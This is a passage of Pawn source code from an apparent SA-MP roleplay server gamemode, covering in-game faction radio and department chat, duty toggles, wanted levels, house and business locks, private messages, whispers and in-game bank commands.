            else if(gTeam[playerid] == TEAM_MEDIC ||PlayerInfo[playerid][pMember]==4||PlayerInfo[playerid][pLeader]==4)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** Paramedic/fireman Leader %s(radio): %s, over **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Professional fireman Commander %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Fireman Commander %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Paramadic Commander %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Pro Paramadic  %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Paramedic %s(radio): %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** Paramedic trainee %s(radio): %s, over. **", sendername, result); }
                SendRadioMessage(4, COLOR_BLUE, string);
                //printf("%s", string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_ALI, "You are not a Cop/medic");
                return 1;
            }
        }
        return 1;
    }
//----------------------------------[duty]-----------------------------------------------
    if(strcmp(cmd, "/duty", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            if(IsACop(playerid))
            {
                if (!PlayerToPoint(3, playerid,236.390625,109.871276,1003.225708) && TooHouse[playerid] != PINFO[playerid][pPhousekey]) return SCM(playerid,COLOR_ALI,"You are not in police armoury or your home.");
                    if(OnDuty[playerid] == 0)
                    {
                        if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
                        {
                        format(string, sizeof(string), "Officer %s took a Badge and a Gun from his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        if(PINFO[playerid][pGunLic] >= 1)
                        {
                        GivePlayerTofang(playerid, 24, 100);
                        GivePlayerTofang(playerid, 3, 0);
                        GivePlayerTofang(playerid, 41, 500);
                        GivePlayerTofang(playerid, 31, 200);
                        }
                        else
                        {
                        SCM(playerid,COLOR_ALI,"You haven't a Weapon license.");
                        }
                        SetPlayerZereh(playerid, 100);
                        SetPlayerKhoon(true, playerid, 100);
                        OnDuty[playerid] = 1;
                        }
                        else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
                        {
                        format(string, sizeof(string), "Agent %s took a Badge and Gun from his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        if(PINFO[playerid][pGunLic] >= 1)
                        {
                        GivePlayerTofang(playerid, 24, 100);
                        GivePlayerTofang(playerid, 3, 0);
                        GivePlayerTofang(playerid, 41, 500);
                        GivePlayerTofang(playerid, 31, 200);
                        }
                        else
                        {
                        SCM(playerid,COLOR_ALI,"You haven't a Weapon license.");
                        }
                        SetPlayerZereh(playerid, 100);
                        SetPlayerKhoon(true, playerid, 100);
                        OnDuty[playerid] = 1;
                        }
                        else if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
                        {
                        format(string, sizeof(string), "Agent %s took a Badge and Gun from his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        if(PINFO[playerid][pGunLic] >= 1)
                        {
                        GivePlayerTofang(playerid, 24, 100);
                        GivePlayerTofang(playerid, 3, 0);
                        GivePlayerTofang(playerid, 41, 500);
                        GivePlayerTofang(playerid, 31, 250);
                        }
                        else
                        {
                        SCM(playerid,COLOR_ALI,"You haven't a Weapon license.");
                        }
                        SetPlayerZereh(playerid, 100);
                        SetPlayerKhoon(true, playerid, 100);
                        OnDuty[playerid] = 1;
                        }
                        else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
                        {
                        format(string, sizeof(string), "Guard %s took a Badge and Gun from his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        if(PINFO[playerid][pGunLic] > 0)
                        {
                        GivePlayerTofang(playerid, 24, 100);
                        GivePlayerTofang(playerid, 3, 0);
                        GivePlayerTofang(playerid, 41, 500);
                        GivePlayerTofang(playerid, 21, 250);
                        }
                        else
                        {
                        SCM(playerid,COLOR_ALI,"You haven't a Weapon license.");
                        }
                        SetPlayerZereh(playerid, 100);
                        SetPlayerKhoon(true, playerid, 100);
                        OnDuty[playerid] = 1;
                        }
                    }
                    else if(OnDuty[playerid] == 1)
                    {
                        if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
                        {
                        format(string, sizeof(string), "Agent %s places his Badge and Gun in his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        ResetPlayerTofang(playerid);
                        SetPlayerZereh(playerid, 0);
                        OnDuty[playerid] = 0;
                        }
                        else if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
                        {
                        format(string, sizeof(string), "Officer %s places his Badge and Gun in his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        ResetPlayerTofang(playerid);
                        SetPlayerZereh(playerid, 0);
                        OnDuty[playerid] = 0;
						}
                        else if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
                        {
                        format(string, sizeof(string), "Officer %s places his Badge and Gun in his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        ResetPlayerTofang(playerid);
                        SetPlayerZereh(playerid, 0);
                        OnDuty[playerid] = 0;
                        }
                        else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
                        {
                        format(string, sizeof(string), "Guard %s places his Badge and Gun in his/her locker.", sendername);
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        ResetPlayerTofang(playerid);
                        SetPlayerZereh(playerid, 0);
                        OnDuty[playerid] = 0;
                        }
                    }
            }
            else if(PlayerInfo[playerid][pMember] == 4||PlayerInfo[playerid][pLeader] == 4)
            {
                if(MedicDuty[playerid] == 1)
                {
                    SendClientMessage(playerid, COLOR_MEDIC, "You are now Off Duty from your Medic job and will not receive calls anymore.");
                    MedicDuty[playerid] = 0;
                    Medics -= 1;
                }
                else
                {
                    SendClientMessage(playerid, COLOR_MEDIC, "You are now On Duty with your Medic job and will receive calls from people in need.");
                    MedicDuty[playerid] = 1;
                    Medics += 1;

                }
            }

            else
            {
                SendClientMessage(playerid, COLOR_ALI, "You are not a Cop/Medic.");
            }
        }
        return 1;
    }
//-------------------[Jobduty]-----------------------------------------------
    if(strcmp(cmd, "/jobduty", true) == 0)
    {
            if(PlayerInfo[playerid][pJob] == 7)
            {
                if(JobDuty[playerid] == 1)
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now Off Duty from your Car Mechanic Job and will not receive calls anymore.");
                    JobDuty[playerid] = 0;
                    Mechanics -= 1;
                }
                else
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now On Duty with your Car Mechanic Job and will receive calls from people in need.");
                    JobDuty[playerid] = 1;
                    Mechanics += 1;

                }
                 return 1;
            }
else
{
SCM(playerid, COLOR_LIGHTBLUE, "You are not a car mechanic.");
return 1;
}
}
//----------------------------------[departments]-----------------------------------------------
   if(strcmp(cmd, "/departments", true) == 0 || strcmp(cmd, "/d", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/d)epartments [department chat]");
                return 1;
            }
            if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** PD Leader %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Chief %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Colonel %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Captain %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Sergeant %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Police Officer %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** Soldier %s: %s, over. **", sendername, result); }
                else
                {
                    format(string, sizeof(string), "** PD Leader %s: %s, over. **", sendername, result);
                }
                SendTeamMessage(2, COLOR_DEPART2, string);
                SendTeamMessage(1, COLOR_DEPART2, string);
                //printf("%s", string);
                return 1;
            }
            else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** FBI Leader %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Director %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Deputy Director %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Unit Chief %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Supervisory Special Agent %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Special Agent %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** New Agent Trainee %s: %s, over. **", sendername, result); }
                else
                {
                    format(string, sizeof(string), "** FBI Leader %s: %s, over. **", sendername, result);
                }
                SendTeamMessage(2, COLOR_DEPART2, string);
                SendTeamMessage(1, COLOR_DEPART2, string);
                //printf("%s", string);
                return 1;
            }
            else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** National Guard Leader %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Marshal %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Sergeant Major %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Master Sergeant %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Sergeant %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Corporal %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** Private %s: %s, over. **", sendername, result); }
                else
                {
                    format(string, sizeof(string), "** National Guard Leader %s: %s, over. **", sendername, result);
                }
                SendTeamMessage(2, COLOR_DEPART2, string);
                SendTeamMessage(1, COLOR_DEPART2, string);
                //printf("%s", string);
                return 1;
            }
            else if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** SFPD Leader %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** SFPD Chief %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** SFPD Colonel %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** SFPD Captain %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** SFPD Sergeant %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** SFPD Officer %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** SFPD Soldier %s: %s, over. **", sendername, result); }
                else
                {
                    format(string, sizeof(string), "** SFPD Leader %s: %s, over. **", sendername, result);
                }
                SendTeamMessage(2, COLOR_DEPART2, string);
                SendTeamMessage(1, COLOR_DEPART2, string);
                //printf("%s", string);
                return 1;
            }
            if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "** Paramedic/fireman Leader %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** Professional fireman Commander %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** Fireman Commander %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** Paramadic Commander %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** Pro Paramedic %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** Paramedic %s: %s, over. **", sendername, result); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** Paramedic trainee %s: %s, over. **", sendername, result); }
                else
                {
                    format(string, sizeof(string), "** Fireman & Paramedic Leader %s: %s, over. **", sendername, result);
                }
                SendTeamMessage(2, COLOR_DEPART2, string);
                SendTeamMessage(1, COLOR_DEPART2, string);
                //printf("%s", string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_ALI, "You are not Cop/Medic.");
                return 1;
            }
        }
        return 1;
    }
//----------------------------------[SetCrim]-----------------------------------------------
    if(strcmp(cmd, "/suspect", true) == 0 || strcmp(cmd, "/su", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not on-Duty.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/su)spect [playerid/PartOfName] [WantedLevel] [Reason]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(AFK[giveplayerid] == 1 || AFKTime[giveplayerid] > 70)
            {
                SendClientMessage(playerid, COLOR_GREY, "He is away from keyboard!");
                return 1;
            }
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if (gTeam[giveplayerid] != TEAM_COP)
                        {
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            tmp = strtok(cmdtext, idx);
                            if(!strlen(tmp))
                            {
                                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/su)spect [playerid/PartOfName] [WantedLevel] [Reason]");
                                return 1;
                            }
                            new strings[256];
                            new stringss[128];
                            new wanted = strval(tmp);
                            if(PlayerInfo[giveplayerid][pWanted] >= 6)
                            {
                            SCM(playerid,COLOR_ALI,"That player has 6 wanted level (full).");
                            return 1;
                            }
                            if(wanted == 0 || wanted >= 7-GetPlayerWantedLevel(giveplayerid))
                            {
                                new limitstr[128];
                                format(limitstr, 128, "Invalid wanted level amount ( Type a wanted level amount between 1 and %i.", 6-GetPlayerWantedLevel(giveplayerid));
                                SCM(playerid, COLOR_ALI, limitstr);
                                return 1;
                            }
                            new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/su)spect [playerid/PartOfName] [WantedLevel] [Reason]");
                            return 1;
                        }
                            SetPlayerWantedLevel(giveplayerid,GetPlayerWantedLevel(giveplayerid)+wanted);
                            format(strings, sizeof(strings), "%s",(result));
                            format(stringss, sizeof(stringss), "You gave %d wanted level to %s.",wanted,giveplayer);
                            SCM(playerid,COLOR_LIGHTRED,stringss);
                            SetPlayerCriminal(giveplayerid,playerid, strings,wanted);
                            return 1;
                        }
                        else { SendClientMessage(playerid, COLOR_BLUE, "You can't suspect a Cop."); }

                    }
                }
                else
                {
                        format(string, sizeof(string), "That Player is offline.");
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        return 1;
                }
            }
            else { SendClientMessage(playerid, COLOR_BLUE, "You are not a Cop."); }

        }
        return 1;
    }
    if(strcmp(cmd, "/open", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            for(new i = 0; i < sizeof(HouseInfo); i++)
            {
                if (PlayerToPoint(2, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]) || (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]) && GetPlayerVirtualWorld(playerid) == HouseInfo[i][hWorld]))
                {
                    if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
					if(HouseInfo[i][hSQLID] != PINFO[playerid][pPhousekey]) return SCM(playerid,COLOR_Good,"This is not your house.");
                        if(HouseInfo[i][hLock] == 1)
                        {
                            HouseInfo[i][hLock] = 0;
                            SaveKonValH(i, "hLock", 0);
                            GameTextForPlayer(playerid, "~w~Door ~g~Unlocked", 5000, 6);
                            PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                            return 1;
                        }
                        if(HouseInfo[i][hLock] == 0)
                        {
                            HouseInfo[i][hLock] = 1;
                            SaveKonValH(i, "hLock", 1);
                            GameTextForPlayer(playerid, "~w~Door ~r~Locked", 5000, 6);
                            PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                            return 1;
                        }
                }
            }
            for(new i = 0; i < sizeof(BizzInfo); i++)
            {
                if (PlayerToPoint(3, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) || (PlayerToPoint(3, playerid,BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ]) && GetPlayerVirtualWorld(playerid) == BizzInfo[i][bVW]))
                {
                    if(PlayerInfo[playerid][pPbiskey] == i)
                    {
                        if(BizzInfo[i][bLocked] == 1)
                        {
                            BizzInfo[i][bLocked] = 0;
                            GameTextForPlayer(playerid, "~w~Bussiness ~g~Open", 5000, 6);
                            PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                            return 1;
                        }
                        if(BizzInfo[i][bLocked] == 0)
                        {
                            BizzInfo[i][bLocked] = 1;
                            GameTextForPlayer(playerid, "~w~Bussiness ~r~Closed", 5000, 6);
                            PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                            return 1;
                        }
                        OnBizUpdate(i);
                    }
                    else
                    {
                        GameTextForPlayer(playerid, "~r~You Dont Have A Key", 5000, 6);
                        return 1;
                    }
                }
            }
        }
        return 1;
    }

//----------------------------------[PM]-----------------------------------------------
    if(strcmp(cmd, "/pm", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 0 && PINFO[playerid][pHelper] < 1)
            {
            SCM(playerid,COLOR_YELLOW2,"Error: You are not admin or helper.");
            return 1;
            }
                if(gPlayerLogged[playerid] == 0)
                {
                    SendClientMessage(playerid, COLOR_GREY, "You havent logged in yet!");
                    return 1;
                }
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /pm [playerid/PartOfName] [text]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if (IsPlayerConnected(giveplayerid))
                {
                     if(giveplayerid != INVALID_PLAYER_ID)
                     {
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                        result[idx - offset] = cmdtext[idx];
                        idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /pm [playerid/PartOfName] [text]");
                            return 1;
                        }
                        format(string, sizeof(string), "« PM From %s: %s »", sendername, (result));
                        SendClientMessage(giveplayerid, 0xF7E815AA, string);
                        format(string, sizeof(string), "« PM sent to %s: %s »", giveplayer, (result));
                        SendClientMessage(playerid,  0xF7E815AA, string);
						printf("« [PM] Sender %s To %s : %s »", sendername, giveplayer, (result));
                        return 1;
                    }
                }
                else
                {
                    format(string, sizeof(string), "That Player is offline.");
                    SendClientMessage(playerid, COLOR_GRAD1, string);
                }
        }
        return 1;
    }
//----------------------------------[Whisper]-----------------------------------------------
    if(strcmp(cmd, "/whisper", true) == 0 || strcmp(cmd, "/w", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "You havent logged in yet.");
                return 1;
            }
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
            if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
            if(HidePM[giveplayerid] == 1)
            {
            SendClientMessage(playerid, COLOR_LIGHTGREEN, "Whisper Tog Disable for This player.");
            return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/w)hisper [playerid/PartOfName] [whisper text]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if (IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    new Float:x, Float:y, Float:z;
                    GetPlayerPos(giveplayerid,x,y,z);
                    if(PlayerToPoint(5, playerid, x, y, z))
                    {
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/w)isper [playerid/PartOfName] [whisper text]");
                            return 1;
                        }
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "Whispers from %s: %s",sendername, (result));
                        SendClientMessage(giveplayerid, COLOR_YELLOW, string);
                        format(string, sizeof(string), "Whispers to %s: %s",giveplayer, (result));
                        SendClientMessage(playerid, COLOR_YELLOW, string);
                        return 1;
                    }
                    else
                    {
                        SendClientMessage(playerid,  COLOR_GREY, "Player is not near you !");
                        return 1;
                    }
                }
            }
            else
            {
                    format(string, sizeof(string), "that player is offline.");
                    SendClientMessage(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }
//----------------------------------[Car Whisper]-----------------------------------------------
if(strcmp(cmd, "/cw", true) == 0 || strcmp(cmd, "/carwhisper", true) == 0 || strcmp(cmd, "/cwhisper", true) == 0)
{
    if(IsPlayerConnected(playerid))
    {
        if(gPlayerLogged[playerid] == 0)
        {
            SendClientMessage(playerid, COLOR_GREY, "   You havent logged in yet!");
            return 1;
        }
        if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"You cannot speak when you are muted.");
        if(!IsPlayerInAnyVehicle(playerid))
        {
            SendClientMessage(playerid, COLOR_GREY, "   You are not in a car!");
            return 1;
        }
           	if(PlayerInfo[playerid][pLevel] < 2)
		{
    		SendClientMessage(playerid, COLOR_RED, "Shoma bayad Level +2 Bashid.");
          	return 1;
		}
        if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"Shoma Mute Hastid.");
        GetPlayerName(playerid, sendername, sizeof(sendername));
        new length = strlen(cmdtext);
        while ((idx < length) && (cmdtext[idx] <= ' '))
        {
            idx++;
        }
        new offset = idx;
  new result[64];
        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
        {
            result[idx - offset] = cmdtext[idx];
            idx++;
        }
        result[idx - offset] = EOS;
        if(!strlen(result))
        {
            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: (/cw)hisper [text]");
            return 1;
        }
        new vehicle = GetPlayerVehicleID(playerid);
        for( new i = 0; i<LastPID; i++ )
        {
            if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i))
            {
                if(GetPlayerVehicleID(i) == vehicle)
                {
                        new strchat[150];
                        format(strchat, sizeof(strchat), "(CarWhisper) %s Goft: %s", sendername, result);
                        SendClientMessage(i,  0xABFF3AFF, strchat);
                }
            }
        }
    }
    return 1;
}
//----------------------------------[Bank System]-----------------------------------------------

    if(strcmp(cmd, "/withdraw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAtBankk(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /withdraw [amount]");
                    format(string, sizeof(string), "  You Have $%s in your account.", FormatNumber(PlayerInfo[playerid][pAccount]));
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    return 1;
                }
                new cashdeposit = strval(tmp);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /withdraw [amount]");
                    format(string, sizeof(string), "  You Have $%s in your account.", FormatNumber(PlayerInfo[playerid][pAccount]));
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    return 1;
                }
                if (cashdeposit > PlayerInfo[playerid][pAccount] || cashdeposit < 1)
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "   You dont have that much !");
                    return 1;
                }
                GivePlayerPool(playerid,cashdeposit);
                PlayerInfo[playerid][pAccount]=PlayerInfo[playerid][pAccount]-cashdeposit;
                SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                format(string, sizeof(string), "  You Have Withdrawn $%s from your account Total: $%s ", FormatNumber(cashdeposit),FormatNumber(PlayerInfo[playerid][pAccount]));
                SendClientMessage(playerid, COLOR_YELLOW, string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "You are not at the Bank.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/deposit", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAtBankk(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                SendClientMessage(playerid, COLOR_GRAD2, "Type: /deposit [amount]");
                format(string, sizeof(string), "You have $%i in you account.", FormatNumber(PlayerInfo[playerid][pAccount]));
                SendClientMessage(playerid, COLOR_GRAD3, string);
                return 1;
                }
                new cashdeposit = strval(tmp);
                if(!strlen(tmp))
                {
                SendClientMessage(playerid, COLOR_GRAD2, "Type: /deposit [amount]");
                format(string, sizeof(string), "You have $%i in you account.", PlayerInfo[playerid][pAccount]);
                SendClientMessage(playerid, COLOR_GRAD3, string);
                return 1;
                }
                if (cashdeposit > GetPlayerPool(playerid) || cashdeposit < 1)
                {
                SendClientMessage(playerid, COLOR_GRAD2, "** You dont have that much");
                return 1;
                }
                GivePlayerPool(playerid,-cashdeposit);
                new curfunds = PlayerInfo[playerid][pAccount];
                PlayerInfo[playerid][pAccount]=cashdeposit+PlayerInfo[playerid][pAccount];
                SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                SendClientMessage(playerid, COLOR_WHITE, "|___ BANK STATMENT ___|");
                format(string, sizeof(string), "Old Balance: $%s", FormatNumber(curfunds));
                SendClientMessage(playerid, COLOR_GRAD2, string);
                format(string, sizeof(string), "Deposit: $%s",FormatNumber(cashdeposit));
                SendClientMessage(playerid, COLOR_GRAD4, string);
                SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
